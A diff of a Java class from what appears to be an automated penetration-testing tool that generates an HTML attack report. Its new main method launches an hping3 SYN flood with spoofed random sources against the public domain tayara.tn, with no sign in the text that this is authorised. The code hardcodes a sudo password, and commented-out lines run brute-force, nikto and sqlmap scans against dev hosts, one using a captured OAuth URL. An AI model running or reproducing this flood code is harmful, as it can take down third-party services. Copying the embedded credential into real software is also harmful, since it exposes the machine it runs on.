@@ -17,34 +17,66 @@ import java.util.Calendar;
 class Tests {
 
     private static FileWriter file;
-@Test
+
+    public static void main(String[] args) throws IOException, InterruptedException {
+        String path="index.html";
+        PrintWriter writer = new PrintWriter(path, "UTF-8");
+        String bloc1="<!DOCTYPE html> <html lang=\"en\">  <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Document</title>     <link rel=\"stylesheet\" href=\"style.css\">     <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <link href=\"https://fonts.googleapis.com/css2?family=Roboto+Flex:opsz@8..144&display=swap\" rel=\"stylesheet\">   </head>  <body>     <nav>         <div class=\"reportTitle\">             <span>Penetration test report</span>         </div>     </nav>     <div class=\"container\">         <div class=\"sideBar\">             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"dos.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Dos Attack                     </span>                 </div>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"BruteForce.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Brute force attack                     </span>                 </div>               </a>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"sqlinj.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         SQL Injection Scan                     </span>                 </div>               </a>             <a href=\"#section1\" class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"nikto.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Nikto scan                     </span>                 </div>                  </a>                  <a class=\"scan\">                     <div class=\"image\">                         <img  class=\"scanImg\" src=\"zapscan.jpeg\" alt=\"\">                          </div>                     <div class=\"name\">                         <span class=\"attackName\">                             Owasp zap scan                         </span>                     </div>                      </a>         </div>         <div class=\"content\">";
+        String dosResult=dosReportBloc(Dos("tayara.tn").toString(),"tayara.tn");
+        String blocn=" </div>     </div>     </body>  </html>";
+        writer.println(bloc1+dosResult+blocn);
+        writer.close();
+//        try {
+//            Process proc = Runtime.getRuntime().exec("/home/ahmed/Downloads/jenkins-example-master/src/test/java/com/penetration/testing/test.sh"); //Whatever you want to execute
+//            BufferedReader read = new BufferedReader(new InputStreamReader(
+//                    proc.getInputStream()));
+//            try {
+//                proc.waitFor();
+//            } catch (InterruptedException e) {
+//                System.out.println(e.getMessage());
+//            }
+//            while (read.ready()) {
+//                System.out.println(read.readLine());
+//            }
+//        } catch (IOException e) {
+//            System.out.println(e.getMessage());
+//        }
+////        System.out.println("final"+InetAddress.getByName("local-tt.dev-machinestalk.com").isReachable(20));
+
+    }
+
+    public static String dosReportBloc(String result,String url) {
+        String bloc1="          <div class=\"report\">                 <div class=\"reportName\">                     Dos attack                 </div>                 <div class=\"subReportName\">                     Dos attack report                 </div>                 <div class=\"attackDetails\">                  <span class=\"details\">Attack details:</span>                     <span>- Used tool : hping3</span>                     <span>- number of sent packets : 10000 </span>                     <span>- number of seconds between sending each packet : 10 packets peer second</span>                     <span>- packet body size : 120 bytes</span>    <span>- Website : "+url+"</span>                 </div>";
+        String bloc2="";
+        if(result.equals("true")){
+bloc2="                <div class=\"failAlert\">                     Dos attack succeeded                 </div>";
+        }else {
+bloc2="  <div class=\"successAlert\">                     Dos attack failed                 </div>";
+        }
+        String bloc3="</div>";
+        return bloc1+bloc2+bloc3;
+    }
+
+    @Test
     public void testZero() throws IOException, InterruptedException {
         System.out.println("=========================================================================================================");
         System.out.println("=========================================================================================================");
-//        JSONObject obj = new JSONObject();
-
-//        obj.put("Dos", Dos("local-tt.dev-machinestalk.com"));
-//        int spacesToIndentEachLevel = 2;
-//        String rst= new JSONObject(obj.toString()).toString(spacesToIndentEachLevel);
-    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");
-    LocalDateTime now = LocalDateTime.now();
-    String path="index.html";
-        PrintWriter writer = new PrintWriter(path, "UTF-8");
-        writer.println("<!DOCTYPE html>\n" +
-                "<html lang=\"en\">\n" +
-                "<head>\n" +
-                "</head>\n" +
-                "<body>\n" +
-                "    <h1>\n" +now+
-                "\n" +
-                "        \n" +
-                "    </h1>\n" +
-                "</body>\n" +
-                "</html>");
-
-
-
-        writer.close();
+//        String path="index.html";
+//        PrintWriter writer = new PrintWriter(path, "UTF-8");
+//        String bloc1="<!DOCTYPE html> <html lang=\"en\">  <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Document</title>     <link rel=\"stylesheet\" href=\"style.css\">     <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <link href=\"https://fonts.googleapis.com/css2?family=Roboto+Flex:opsz@8..144&display=swap\" rel=\"stylesheet\">   </head>  <body>     <nav>         <div class=\"reportTitle\">             <span>Penetration test report</span>         </div>     </nav>     <div class=\"container\">         <div class=\"sideBar\">             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"dos.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Dos Attack                     </span>                 </div>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"BruteForce.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Brute force attack                     </span>                 </div>               </a>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"sqlinj.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         SQL Injection Scan                     </span>                 </div>               </a>             <a href=\"#section1\" class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"nikto.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Nikto scan                     </span>                 </div>                  </a>                  <a class=\"scan\">                     <div class=\"image\">                         <img  class=\"scanImg\" src=\"zapscan.jpeg\" alt=\"\">                          </div>                     <div class=\"name\">                         <span class=\"attackName\">                             Owasp zap scan                         </span>                     </div>                      </a>         </div>         <div class=\"content\">";
+//        String dosResult=dosReportBloc(Dos("tayara.tn").toString(),"tayara.tn");
+//        String blocn=" </div>     </div>     </body>  </html>";
+//        writer.println(bloc1+dosResult+blocn);
+//        writer.close();
+//    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");
+//    LocalDateTime now = LocalDateTime.now();
+//    String path="index.html";
+//        PrintWriter writer = new PrintWriter(path, "UTF-8");
+//        String bloc1="<!DOCTYPE html> <html lang=\"en\">  <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Document</title>     <link rel=\"stylesheet\" href=\"style.css\">     <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <link href=\"https://fonts.googleapis.com/css2?family=Roboto+Flex:opsz@8..144&display=swap\" rel=\"stylesheet\">   </head>  <body>     <nav>         <div class=\"reportTitle\">             <span>Penetration test report</span>         </div>     </nav>     <div class=\"container\">         <div class=\"sideBar\">             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"dos.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Dos Attack                     </span>                 </div>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"BruteForce.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Brute force attack                     </span>                 </div>               </a>               </a>             <a class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"sqlinj.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         SQL Injection Scan                     </span>                 </div>               </a>             <a href=\"#section1\" class=\"scan\">                 <div class=\"image\">                     <img  class=\"scanImg\" src=\"nikto.png\" alt=\"\">                  </div>                 <div class=\"name\">                     <span class=\"attackName\">                         Nikto scan                     </span>                 </div>                  </a>                  <a class=\"scan\">                     <div class=\"image\">                         <img  class=\"scanImg\" src=\"zapscan.jpeg\" alt=\"\">                          </div>                     <div class=\"name\">                         <span class=\"attackName\">                             Owasp zap scan                         </span>                     </div>                      </a>         </div>         <div class=\"content\">";
+//       String dosResult=dosReportBloc(Dos("tayara.tn").toString(),"tayara.tn");
+//        String blocn=" </div>     </div>     </body>  </html>";
+//        writer.println(bloc1+dosResult+blocn);
+//        writer.close();
 //    obj.put("Brute Force Attack", hydraScan());
 //    obj.put("Nikto scan",niktoScan());
 //    obj.put("SQLMAP", SQLMapScan("http://local-iam.dev-machinestalk.com/auth/realms/30d74b00-c16b-11ec-b363-df9b89c1f66c/protocol/openid-connect/auth?response_type=code&client_id=thingstalk&scope=email%20openid%20profile&state=4xsrWMTDw4SW6yPF8TyfOTZs0ZHZb2G9mLee55jahNE%3D&redirect_uri=http://local-tt.dev-machinestalk.com/login/oauth2/code/&nonce=QEag5SgTJ7uZFpy358sgwTGqY4ASnMoazLBmPkzYnXA","username=hello&password=hello%3A%29",1));
@@ -227,16 +259,20 @@ class Tests {
         System.out.println("dos attack is running");
         String prefix = "/bin/bash";
         String c = "-c";
-        String terminalCommand = "sudo -S <<< \"23474629\" hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source -host "+ url;
+        String terminalCommand = " echo \"23474629\" | sudo -S -k hping3 "+url+"  -q -n -d 120 -S -p 80 --flood --rand-source";
         ProcessBuilder pb = new ProcessBuilder(new String[] {prefix, c, terminalCommand});
         File workingDirectory = new File("/home");
+        System.out.println(InetAddress.getByName(url).isReachable(20));
         pb.directory(workingDirectory);
         Process p = pb.start();
         Thread.sleep(3000);
         JSONObject obj = new JSONObject();
         JSONObject obj2 = new JSONObject();
+        System.out.println(InetAddress.getByName(url).isReachable(20));
+
         obj2.put("result",!InetAddress.getByName(url).isReachable(20));
         obj.put("Dos attack", obj2);
+
         p.destroy();
         return obj2;
     }
